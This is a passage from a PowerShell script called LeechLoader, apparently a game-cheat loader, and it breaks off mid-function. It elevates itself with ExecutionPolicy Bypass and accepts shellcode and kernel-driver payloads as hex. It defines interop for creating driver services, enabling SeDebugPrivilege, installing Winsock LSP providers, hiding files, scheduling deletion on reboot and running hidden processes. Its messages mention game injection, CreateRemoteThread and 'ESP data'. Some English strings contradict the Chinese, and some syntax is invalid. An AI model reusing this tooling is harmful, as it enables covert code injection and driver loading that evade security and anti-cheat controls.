using namespace System
using namespace System.Runtime.InteropServices
using namespace System.Text
using namespace System.Net
using namespace System.Net.NetworkInformation

# LeechLoader.ps1
# LeechLoader PowerShell 整合单脚本版
# 完整移植自 LeechLoader C++ 项目并合并为单个独立脚本。
#
# 用法：
#   .\LeechLoader.ps1                                    # 交互模式
#   .\LeechLoader.ps1 -Script -Mode 2                    # 脚本模式
#   .\LeechLoader.ps1 -Script -Mode 3 -LeechHex "..." -DriverHex "..."  # 命令行参数模式

[CmdletBinding()]
param(
    [switch]$Script,           # 脚本/命令行启动模式

    [int]$Mode = 0,            # 连接模式：1=DMA, 2=TCP/NNG, 3=USB

    [string]$Api = "",         # 自定义 API URL

    [string]$LeechHex = "",    # Leech shellcode（hex字符串或 @文件路径）

    [string]$DriverHex = ""    # Driver shellcode（hex字符串或 @文件路径）
)

Set-StrictMode -Off
$ErrorActionPreference = "Continue"

# ── 1. 权限检查与 UAC 自动提权 ──
$principal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
$isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "注意：需要管理员权限。正在请求 UAC 提权..." -ForegroundColor Yellow
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" " +
    (if ($Script) { "-Script " }     else { "" }) +
    (if ($Mode -ne 0) { "-Mode $Mode " } else { "" }) +
    (if ($Api) { "-Api `"$Api`" " } else { "" }) +
    (if ($LeechHex) { "-LeechHex `"$LeechHex`" " }  else { "" }) +
    (if ($DriverHex) { "-DriverHex `"$DriverHex`" " } else { "" })
    try {
        Start-Process powershell -ArgumentList $arguments -Verb RunAs
    }
    catch {
        Write-Host "提权失败：用户拒绝或系统限制。" -ForegroundColor Red
    }
    exit
}

# ── 2. 加载/编译 Win32 API ──
$WinAPITypeName = 'LeechLoader.WinAPI'
if (-not ([System.Management.Automation.PSTypeName]$WinAPITypeName).Type) {
    $WinAPICode = @'
/* */ using System;
/* */ using System.Runtime.InteropServices;
/* */ using System.Text;
/* */ using System.Net;
/* */ using System.Net.NetworkInformation;

namespace LeechLoader {
    public static class Consts {
        public const uint SC_MANAGER_ALL_ACCESS       = 0xF003F;
        public const uint SC_MANAGER_CREATE_SERVICE   = 0x0002;
        public const uint SC_MANAGER_CONNECT          = 0x0001;

        public const uint SERVICE_ALL_ACCESS          = 0xF01FF;
        public const uint SERVICE_QUERY_STATUS        = 0x0004;
        public const uint SERVICE_STOP                = 0x0020;
        public const uint SERVICE_START               = 0x0010;
        public const uint SERVICE_DELETE              = 0x10000;
        public const uint SERVICE_QUERY_CONFIG        = 0x0001;

        public const uint SERVICE_WIN32_SHARE_PROCESS = 0x00000020;
        public const uint SERVICE_WIN32_OWN_PROCESS   = 0x00000010;
        public const uint SERVICE_KERNEL_DRIVER       = 0x00000001;

        public const uint SERVICE_DEMAND_START        = 0x00000003;
        public const uint SERVICE_AUTO_START          = 0x00000002;
        public const uint SERVICE_DISABLED            = 0x00000004;

        public const uint SERVICE_ERROR_IGNORE        = 0x00000000;
        public const uint SERVICE_ERROR_NORMAL        = 0x00000001;

        public const uint SERVICE_CONTROL_STOP        = 0x00000001;
        public const uint SERVICE_CONTROL_START       = 0x00000004;

        public const uint SERVICE_STOPPED             = 0x00000001;
        public const uint SERVICE_RUNNING             = 0x00000004;
        public const uint SERVICE_STOP_PENDING        = 0x00000003;

        public const uint TOKEN_QUERY                 = 0x00000008;
        public const uint TOKEN_ADJUST_PRIVILEGES     = 0x00000020;

        public const uint FILE_ATTRIBUTE_HIDDEN       = 0x00000002;
        public const uint FILE_ATTRIBUTE_SYSTEM       = 0x00000004;
        public const uint FILE_ATTRIBUTE_NORMAL       = 0x00000080;

        public const uint REG_SZ                      = 1;
        public const uint REG_EXPAND_SZ               = 2;
        public const uint REG_DWORD                   = 4;
        public const uint KEY_WRITE                   = 0x20006;
        public const uint REG_OPTION_NON_VOLATILE     = 0;

        public const uint PROCESS_ALL_ACCESS          = 0x1F0FFF;
        public const uint PROCESS_QUERY_INFORMATION   = 0x400;
        public const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;

        public const uint CREATE_NO_WINDOW            = 0x08000000;
        public const uint STARTF_USESHOWWINDOW        = 0x00000001;
        public const ushort SW_HIDE                   = 0;
        public const ushort SW_NORMAL                 = 1;

        public const uint MOVEFILE_DELAY_UNTIL_REBOOT = 0x00000004;
        public const uint SE_PRIVILEGE_ENABLED        = 2;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SERVICE_STATUS {
        public uint dwServiceType;
        public uint dwCurrentState;
        public uint dwControlsAccepted;
        public uint dwWin32ExitCode;
        public uint dwServiceSpecificExitCode;
        public uint dwCheckPoint;
        public uint dwWaitHint;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_ELEVATION {
        public uint TokenIsElevated;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public uint PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }

    public static class WinAPI {
        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern IntPtr OpenSCManagerW(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern IntPtr OpenServiceW(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern IntPtr CreateServiceW(
            IntPtr hSCManager,
            string lpServiceName,
            string lpDisplayName,
            uint dwDesiredAccess,
            uint dwServiceType,
            uint dwStartType,
            uint dwErrorControl,
            string lpBinaryPathName,
            string lpLoadOrderGroup,
            IntPtr lpdwTagId,
            string lpDependencies,
            string lpServiceStartName,
            string lpPassword);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool DeleteService(IntPtr hService);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool CloseServiceHandle(IntPtr hSCObject);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool ControlService(IntPtr hService, uint dwControl, ref SERVICE_STATUS lpServiceStatus);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool QueryServiceStatus(IntPtr hService, ref SERVICE_STATUS lpServiceStatus);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool StartServiceW(IntPtr hService, uint dwNumServiceArgs, IntPtr lpServiceArgVectors);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass,
            ref TOKEN_ELEVATION TokenInformation, uint TokenInformationLength, out uint ReturnLength);

        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern bool LookupPrivilegeValueW(string lpSystemName, string lpName, out LUID lpLuid);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
            ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern int RegCreateKeyExW(IntPtr hKey, string lpSubKey, uint Reserved, string lpClass,
            uint dwOptions, uint samDesired, IntPtr lpSecurityAttributes,
            out IntPtr phkResult, out uint lpdwDisposition);

        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern int RegSetValueExW(IntPtr hKey, string lpValueName, uint Reserved, uint dwType,
            byte[] lpData, uint cbData);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern int RegCloseKey(IntPtr hKey);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern uint GetSystemDirectoryW(StringBuilder lpBuffer, uint uSize);

        [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern uint GetModuleFileNameW(IntPtr hModule, StringBuilder lpFilename, uint nSize);

        [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern bool CreateProcessW(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern bool MoveFileExW(string lpExistingFileName, string lpNewFileName, uint dwFlags);

        [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern bool SetFileAttributesW(string lpFileName, uint dwFileAttributes);

        [DllImport("shell32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern bool ShellExecuteExW(ref SHELLEXECUTEINFO lpExecInfo);
    }

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct SHELLEXECUTEINFO {
        public uint cbSize;
        public uint fMask;
        public IntPtr hwnd;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string lpVerb;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string lpFile;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string lpParameters;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string lpDirectory;
        public int nShow;
        public IntPtr hInstApp;
        public IntPtr lpIDList;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string lpClass;
        public IntPtr hkeyClass;
        public uint dwHotKey;
        public IntPtr hIconOrMonitor;
        public IntPtr hProcess;
    }

    public static class WinAPIHelper {
        public static bool IsProcessElevated() {
            IntPtr hToken = IntPtr.Zero;
            try {
                if (!WinAPI.OpenProcessToken(WinAPI.GetCurrentProcess(), Consts.TOKEN_QUERY, out hToken))
                    return false;
                var elevation = new TOKEN_ELEVATION();
                uint dwSize = 0;
                if (!WinAPI.GetTokenInformation(hToken, 20, ref elevation, (uint)Marshal.SizeOf(elevation), out dwSize))
                    return false;
                return elevation.TokenIsElevated != 0;
            } catch {
                return false;
            } finally {
                if (hToken != IntPtr.Zero) WinAPI.CloseHandle(hToken);
            }
        }

        public static string GetSystemDirectory() {
            var sb = new StringBuilder(260);
            WinAPI.GetSystemDirectoryW(sb, 260);
            return sb.ToString();
        }

        public static string GetModulePath() {
            var sb = new StringBuilder(32768);
            WinAPI.GetModuleFileNameW(IntPtr.Zero, sb, (uint)sb.Capacity);
            return sb.ToString();
        }

        public static bool EnableDebugPrivilege() {
            IntPtr hToken = IntPtr.Zero;
            try {
                if (!WinAPI.OpenProcessToken(WinAPI.GetCurrentProcess(),
                    Consts.TOKEN_QUERY | Consts.TOKEN_ADJUST_PRIVILEGES, out hToken))
                    return false;

                LUID luid;
                if (!WinAPI.LookupPrivilegeValueW(null, "SeDebugPrivilege", out luid))
                    return false;

                var tp = new TOKEN_PRIVILEGES();
                tp.PrivilegeCount = 1;
                tp.Privileges.Luid = luid;
                tp.Privileges.Attributes = Consts.SE_PRIVILEGE_ENABLED;

                return WinAPI.AdjustTokenPrivileges(hToken, false, ref tp,
                    (uint)Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero);
            } finally {
                if (hToken != IntPtr.Zero) WinAPI.CloseHandle(hToken);
            }
        }

        public static bool SetRegistryDword(string subKey, string valueName, uint value) {
            IntPtr hKey = IntPtr.Zero;
            try {
                uint disposition;
                int ret = WinAPI.RegCreateKeyExW((IntPtr)unchecked((int)0x80000002), subKey, 0, null,
                    Consts.REG_OPTION_NON_VOLATILE, Consts.KEY_WRITE, IntPtr.Zero, out hKey, out disposition);
                if (ret != 0) return false;
                byte[] data = BitConverter.GetBytes(value);
                return WinAPI.RegSetValueExW(hKey, valueName, 0, Consts.REG_DWORD, data, 4) == 0;
            } finally {
                if (hKey != IntPtr.Zero) WinAPI.RegCloseKey(hKey);
            }
        }

        public static bool SetRegistryExpandSz(string subKey, string valueName, string value) {
            IntPtr hKey = IntPtr.Zero;
            try {
                uint disposition;
                int ret = WinAPI.RegCreateKeyExW((IntPtr)unchecked((int)0x80000002), subKey, 0, null,
                    Consts.REG_OPTION_NON_VOLATILE, Consts.KEY_WRITE, IntPtr.Zero, out hKey, out disposition);
                if (ret != 0) return false;
                byte[] data = Encoding.Unicode.GetBytes(value + "\0");
                return WinAPI.RegSetValueExW(hKey, valueName, 0, Consts.REG_EXPAND_SZ, data, (uint)data.Length) == 0;
            } finally {
                if (hKey != IntPtr.Zero) WinAPI.RegCloseKey(hKey);
            }
        }

        public static bool ScheduleDeleteOnReboot(string filePath) {
            return WinAPI.MoveFileExW(filePath, null, Consts.MOVEFILE_DELAY_UNTIL_REBOOT);
        }
    }

    public static class UdpDiscovery {
        private static System.Net.Sockets.UdpClient _udp;
        private static bool _running;
        public static string DiscoveredIP { get; set; }

        private static int FindUnusedPort(int startPort) {
            for (int port = startPort; port < startPort + 100; port++) {
                System.Net.Sockets.TcpListener tcp = null;
                try {
                    tcp = new System.Net.Sockets.TcpListener(System.Net.IPAddress.Loopback, port);
                    tcp.Start();
                    return port;
                }
                catch { }
                finally {
                    if (tcp != null) {
                        try { tcp.Stop(); } catch {}
                    }
                }
            }
            return 0;
        }

        public static void Start(int port) {
            if (_running) return;
            DiscoveredIP = null;
            try {
                _udp = new System.Net.Sockets.UdpClient(port);
                _udp.Client.ReceiveTimeout = 2000;
                _running = true;
                System.Threading.ThreadPool.QueueUserWorkItem(state => {
                    var remoteEP = new System.Net.IPEndPoint(System.Net.IPAddress.Any, 0);
                    while (_running) {
                        try {
                            byte[] data = _udp.Receive(ref remoteEP);
                            string msg = System.Text.Encoding.ASCII.GetString(data);
                            if (msg == "DISCOVER_REQUEST") {
                                string clientIP = remoteEP.Address.ToString();
                                int freePort = FindUnusedPort(10010);
                                byte[] reply = System.Text.Encoding.ASCII.GetBytes("DISCOVER_RESPONSE|" + freePort);
                                _udp.Send(reply, reply.Length, remoteEP);
                                DiscoveredIP = clientIP;
                            }
                        }
                        catch (System.Net.Sockets.SocketException) { }
                        catch (System.Exception) { break; }
                    }
                });
            }
            catch (System.Exception) { }
        }

        public static void Stop() {
            _running = false;
            if (_udp != null) {
                try { _udp.Close(); } catch {}
                _udp = null;
            }
        }
    }
}
'@
    Add-Type -TypeDefinition $WinAPICode -Language CSharp
}
$LspTypeName = 'LeechLoader.LspAPI'
if (-not ([System.Management.Automation.PSTypeName]$LspTypeName).Type) {
    $LspCode = @'
/* */ using System;
/* */ using System.Runtime.InteropServices;

namespace LeechLoader {
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct WSAPROTOCOL_INFOW {
        public uint   dwServiceFlags1;
        public uint   dwServiceFlags2;
        public uint   dwServiceFlags3;
        public uint   dwServiceFlags4;
        public uint   dwProviderFlags;
        public Guid   ProviderId;
        public uint   dwCatalogEntryId;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 7)]
        public int[]  ProtocolChainEntries;
        public int    ProtocolChainLen;
        public int    iVersion;
        public int    iAddressFamily;
        public int    iMaxSockAddr;
        public int    iMinSockAddr;
        public int    iSocketType;
        public int    iProtocol;
        public int    iProtocolMaxOffset;
        public int    iNetworkByteOrder;
        public int    iSecurityScheme;
        public uint   dwMessageSize;
        public uint   dwProviderReserved;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
        public string szProtocol;
    }

    public static class LspAPI {
        public static readonly Guid ProviderGuid = new Guid("d3c21122-85e1-48f3-9ab6-23d90c7307ef");

        [DllImport("ws2_32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern int WSCEnumProtocols(
            IntPtr lpiProtocols,
            IntPtr lpProtocolBuffer,
            ref uint lpdwBufferLength,
            out int lpErrno);

        [DllImport("ws2_32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern int WSCInstallProvider(
            ref Guid lpProviderId,
            [MarshalAs(UnmanagedType.LPWStr)] string lpszProviderDllPath,
            IntPtr lpProtocolInfoList,
            uint dwNumberOfEntries,
            out int lpErrno);

        [DllImport("ws2_32.dll", SetLastError=true)]
        public static extern int WSCDeinstallProvider(ref Guid lpProviderId, out int lpErrno);

        [DllImport("ws2_32.dll", SetLastError=true)]
        public static extern int WSCWriteProviderOrder([In] uint[] lpwdCatalogEntryId, uint dwNumberOfEntries);
    }
}
'@
    Add-Type -TypeDefinition $LspCode -Language CSharp
}

#endregion

#region ── 4. 所有移植核心函数定义 ──

# ==========================================
# WinAPI 包装函数
# ==========================================
function Test-ProcessElevated {
    return [LeechLoader.WinAPIHelper]::IsProcessElevated()
}

function Get-SystemDirectory {
    return [LeechLoader.WinAPIHelper]::GetSystemDirectory()
}

function Enable-DebugPrivilege {
    $result = [LeechLoader.WinAPIHelper]::EnableDebugPrivilege()
    if (-not $result) {
        Write-Warning "EnableDebugPrivilege 失败，LastError=$([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    }
    return $result
}

function Set-FileAttributesEx {
    param(
        [Parameter(Mandatory)][string]$Path,
        [switch]$Hidden,
        [switch]$System
    )
    $attr = 0u
    if ($Hidden) { $attr = $attr -bor [LeechLoader.Consts]::FILE_ATTRIBUTE_HIDDEN }
    if ($System) { $attr = $attr -bor [LeechLoader.Consts]::FILE_ATTRIBUTE_SYSTEM }
    if ($attr -eq 0) { $attr = [LeechLoader.Consts]::FILE_ATTRIBUTE_NORMAL }
    return [LeechLoader.WinAPI]::SetFileAttributesW($Path, $attr)
}

function Register-DeleteOnReboot {
    param([Parameter(Mandatory)][string]$FilePath)
    return [LeechLoader.WinAPIHelper]::ScheduleDeleteOnReboot($FilePath)
}

function Stop-CurrentProcess {
    param([uint32]$ExitCode = 0)
    [LeechLoader.WinAPI]::TerminateProcess([LeechLoader.WinAPI]::GetCurrentProcess(), $ExitCode) | Out-Null
}

function Set-HklmDword {
    param(
        [Parameter(Mandatory)][string]$SubKey,
        [Parameter(Mandatory)][string]$ValueName,
        [Parameter(Mandatory)][uint32]$Value
    )
    return [LeechLoader.WinAPIHelper]::SetRegistryDword($SubKey, $ValueName, $Value)
}

function Set-HklmExpandSz {
    param(
        [Parameter(Mandatory)][string]$SubKey,
        [Parameter(Mandatory)][string]$ValueName,
        [Parameter(Mandatory)][string]$Value
    )
    return [LeechLoader.WinAPIHelper]::SetRegistryExpandSz($SubKey, $ValueName, $Value)
}

function Start-HiddenProcess {
    param(
        [Parameter(Mandatory)][string]$ExePath,
        [string]$Arguments = "",
        [string]$WorkingDir = ""
    )
    try {
        $si = New-Object LeechLoader.STARTUPINFO
        $si.cb = [uint32][System.Runtime.InteropServices.Marshal]::SizeOf($si)
        $si.dwFlags = [LeechLoader.Consts]::STARTF_USESHOWWINDOW
        $si.wShowWindow = [LeechLoader.Consts]::SW_HIDE
        $pi = New-Object LeechLoader.PROCESS_INFORMATION
        $cmdLine = if ($Arguments) { "`"$ExePath`" $Arguments" } else { "`"$ExePath`"" }
        $wd = if ($WorkingDir) { $WorkingDir } else { $null }

        $ok = [LeechLoader.WinAPI]::CreateProcessW(
            $null, $cmdLine, [IntPtr]::Zero, [IntPtr]::Zero, $false,
            [LeechLoader.Consts]::CREATE_NO_WINDOW, [IntPtr]::Zero, $wd,
            [ref]$si, [ref]$pi)

        if (-not $ok) {
            $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "CreateProcessW 失败，错误码: $err"
            return $null
        }

        if ($pi.hProcess -ne [IntPtr]::Zero) { [LeechLoader.WinAPI]::CloseHandle($pi.hProcess) | Out-Null }
        if ($pi.hThread -ne [IntPtr]::Zero) { [LeechLoader.WinAPI]::CloseHandle($pi.hThread)  | Out-Null }

        return $pi.dwProcessId
    }
    catch {
        Write-Warning "Start-HiddenProcess 异常: $_"
        return $null
    }
}

# ==========================================
# Language 翻译函数
# ==========================================
$script:Translations = @{
    "game.please_start_first"                = @{ zh = "请启动游戏后再打开此程序..."; en = "Please start the game before opening this program..." }
    "game.started"                           = @{ zh = "游戏已启动..."; en = "Game started..." }
    "game.verification_failed"               = @{ zh = "游戏数据校验失败请重启游戏,错误代码:"; en = "Game data verification failed, please restart the game, error code:" }
    "game.md5_verification_failed"           = @{ zh = "主机文件已更新，请重新复制副机生成的主机文件"; en = "Game data verification failed, please restart the game, error code:" }
    "game.integrity_check_success"           = @{ zh = "文件完整性校验成功"; en = "File integrity check successful" }
    "game.injection_success"                 = @{ zh = "注入游戏成功,请务必关闭本程序"; en = "Game injection successful, please close this program" }
    "game.injection_failed"                  = @{ zh = "注入游戏失败，请重新打开本程序"; en = "Game injection failed, please restart this program" }
    "game.close_then_open_host"              = @{ zh = "请关闭游戏再打开主机文件"; en = "Please close the game and then open the host file" }
    "error.firewall_blocking"                = @{ zh = "请关闭防火墙或者其他软件拦截,错误代码:"; en = "Please disable firewall or other software blocking, error code:" }
    "error.run_as_admin"                     = @{ zh = "请管理员运行此程序"; en = "Please run this program as administrator" }
    "error.host_open_process_failed"         = @{ zh = "请管理员运行主机文件,打开进程失败"; en = "Please run host file as administrator, failed to open process" }
    "error.host_alloc_memory_failed"         = @{ zh = "请管理员运行主机文件,申请内存失败"; en = "Please run host file as administrator, failed to allocate memory" }
    "error.host_loadlibrary_failed"          = @{ zh = "请管理员运行主机文件,LoadLibrary"; en = "Please run host file as administrator, LoadLibrary failed" }
    "error.host_createthread_failed"         = @{ zh = "请管理员运行主机文件,CreateRemoteThread"; en = "Please run host file as administrator, CreateRemoteThread failed" }
    "error.auth_fail"                        = @{ zh = "授权数据失败"; en = "auth fail" }
    "error.privilege_escalation_failed"      = @{ zh = "提权失败,请联系管理员"; en = "Privilege escalation failed, please contact administrator" }
    "error.restart_host_and_program"         = @{ zh = "请重启主机程序和本程序"; en = "Please restart the host program and this program" }
    "error.software_has_been_started"        = @{ zh = "软件已启动，无需再次开启"; en = "Software has been started, no need to open again" }
    "error.release_file_failed"              = @{ zh = "释放文件失败,请重启电脑"; en = "Please restart uu,first restart computer" }
    "error.install_iqiyi"                    = @{ zh = "请安装uu加速器,如果已安装,请重启电脑"; en = "Please install uu,restart computer if you have install" }
    "error.program_exception"                = @{ zh = "程序发生异常,请联系开发商"; en = "Program exception occurred, please contact developer" }
    "error.user_declined_elevation"          = @{ zh = "用户拒绝了权限提升请求。"; en = "User declined the privilege elevation request." }
    "error.config.pe_header_no_found_config" = @{ zh = "配置文件错误,请重新生成主机文件。"; en = "pe_header_no_found_config" }
    "error.missing_core_data"                = @{ zh = "缺少核心数据，请重新尝试"; en = "Missing core data, please try again" }
    "network.error"                          = @{ zh = "网络错误,请检查网络是否通畅"; en = "Network error, please check your network connection" }
    "network.timeout"                        = @{ zh = "网络请求超时"; en = "Network request timeout" }
    "server.error"                           = @{ zh = "服务器出现异常.."; en = "Server error occurred..." }
    "auth.data_error"                        = @{ zh = "授权数据错误,请重新尝试"; en = "Authorization data error, please restart this program" }
    "auth.data_error2"                       = @{ zh = "授权数据错误，请重新尝试"; en = "Authorization data error, please restart this program" }
    "auth.deployed_success"                  = @{ zh = "授权数据已成功部署"; en = "Authorization data deployed successfully" }
    "auth.deployed_fail"                     = @{ zh = "授权数据已失败,请重新尝试"; en = "Authorization data deployed successfully" }
    "auth.connect_mode_fail"                 = @{ zh = "模式匹配失败,请将主机文件重新复制"; en = "Pattern matching failed; please re-copy the host file" }
    "auth.usb_discover_fail"                 = @{ zh = "发现USB设备失败,请检查是否已经替换驱动"; en = "Discover USB device failed; please check if the driver has been replaced" }
    "service.create_failed_firewall"         = @{ zh = "创建服务失败,请关闭防火墙"; en = "Failed to create service, please disable firewall" }
    "service.create_failed_param"            = @{ zh = "创建服务失败,参数错误"; en = "Failed to create service, parameter error" }
    "service.dual_start_failed"              = @{ zh = "双机服务启动失败,请重新尝试"; en = "Dual-machine service failed to start, please restart this program" }
    "service.dual_started"                   = @{ zh = "双机服务启动成功"; en = "Dual-machine service started successfully" }
    "service.host_running_ask_uninstall"     = @{ zh = "主机服务已运行, 是否卸载主机服务(Y/N)"; en = "Host service is already running. Do you want to uninstall the host service? (Y/N)" }
    "service.host_uninstalled"               = @{ zh = "主服务已卸载"; en = "Host service uninstalled" }
    "deploy.host_success"                    = @{ zh = "主机文件已部署成功,准备接收数据"; en = "Host file deployed successfully, ready to receive data" }
    "deploy.dual_file"                       = @{ zh = "双机文件已部署,准备启动服务"; en = "Dual-machine file deployed, preparing to start service" }
    "deploy.program_data"                    = @{ zh = "程序数据已成功部署"; en = "Program data deployed successfully" }
    "deploy.dual_data1"                      = @{ zh = "双机数据1已成功部署"; en = "Dual-machine data 1 deployed successfully" }
    "deploy.dual_data2"                      = @{ zh = "双机数据2已成功部署"; en = "Dual-machine data 2 deployed successfully" }
    "deploy.esp_data"                        = @{ zh = "透视数据已成功部署"; en = "ESP data deployed successfully" }
    "device.waiting_discovery"               = @{ zh = "正在等待副机设备发现.."; en = "Waiting for secondary device discovery..." }
    "device.secondary_prefix"                = @{ zh = "副机设备["; en = "Secondary device [" }
    "device.scan_port_fail"                  = @{ zh = "扫描端口失败"; en = "Scan Port Fail" }
    "device.discovered_suffix"               = @{ zh = "]已被发现,进行授权.."; en = "] discovered, authorizing..." }
    "transfer.header_failed"                 = @{ zh = "回传协议头失败"; en = "Failed to send protocol header" }
    "transfer.content_failed"                = @{ zh = "回传数据内容失败"; en = "Failed to send data content" }
    "transfer.unknown_exception"             = @{ zh = "发送数据过程中出现未知异常"; en = "Unknown exception occurred during data transmission" }
    "system.init_success"                    = @{ zh = "初始化成功"; en = "Initialization successful" }
    "system.local_ip"                        = @{ zh = "本地 IP: "; en = "Local IP: " }
    "system.found_local_ip"                  = @{ zh = "发现本地 IP: "; en = "Found local IP: " }
    "system.requesting_admin"                = @{ zh = "正在请求管理员权限..."; en = "Requesting administrator privileges..." }
    "system.preparing_close"                 = @{ zh = "准备关闭程序"; en = "Preparing to close program" }
    "leech.inject_fail"                      = @{ zh = "Leech注入失败"; en = "Leech inject failed" }
    "config.pe_header_no_found_config"       = @{ zh = "配置文件错误,请重新生成主机文件。"; en = "Config error, please regenerate host file." }
}

$script:LogLevelColors = @{
    0 = 'Red'
    1 = 'Green'
    2 = 'Cyan'
}

function Get-CurrentLanguage {
    try {
        $locale = Get-WinSystemLocale -ErrorAction SilentlyContinue
        if ($locale -and $locale.Name -match '^zh') { return 'zh' }
        $geoId = [System.Globalization.RegionInfo]::CurrentRegion.GeoId
        if ($geoId -eq 45 -or $geoId -eq 237) { return 'zh' }
        return 'en'
    }
    catch { return 'zh' }
}
$script:CurrentLanguage = Get-CurrentLanguage

function Get-L10N {
    param([Parameter(Mandatory, Position = 0)][string]$Key)
    if ($script:Translations.ContainsKey($Key)) {
        $entry = $script:Translations[$Key]
        if ($script:CurrentLanguage -eq 'zh') {
            return $entry.zh
        }
        else {
            return $entry.en
        }
    }
    return $Key
}

function Write-ConsoleLog {
    param(
        [Parameter(Mandatory, Position = 0)][string]$Text,
        [Parameter(Position = 1)][int]$Level = 2
    )
    $color = if ($script:LogLevelColors.ContainsKey($Level)) { $script:LogLevelColors[$Level] } else { 'White' }
    $timestamp = (Get-Date).ToString("HH:mm:ss")
    $prefix = switch ($Level) {
        0 { "[ERR ]" }
        1 { "[OK  ]" }
        2 { "[INFO]" }
        default { "[    ]" }
    }
    Write-Host "$timestamp $prefix $Text" -ForegroundColor $color
}

# ==========================================
# Crypto 加密算法函数
# ==========================================
function Convert-HexToBytes {
    param([Parameter(Mandatory, Position = 0)][string]$Hex)
    if ($Hex.Length % 2 -ne 0) {
        throw "Hex string must have an even length"
    }
    $bytes = [byte[]]::new($Hex.Length / 2)
    for ($i = 0; $i -lt $Hex.Length; $i += 2) {
        $bytes[$i / 2] = [Convert]::ToByte($Hex.Substring($i, 2), 16)
    }
    return $bytes
}

function Convert-BytesToHex {
    param([Parameter(Mandatory, Position = 0)][byte[]]$Bytes)
    if ($null -eq $Bytes -or $Bytes.Length -eq 0) { return "" }
    $sb = [System.Text.StringBuilder]::new($Bytes.Length * 2)
    foreach ($b in $Bytes) {
        $sb.Append($b.ToString("x2")) | Out-Null
    }
    return $sb.ToString()
}

function Convert-StringToHex {
    param([Parameter(Mandatory, Position = 0)][string]$Text)
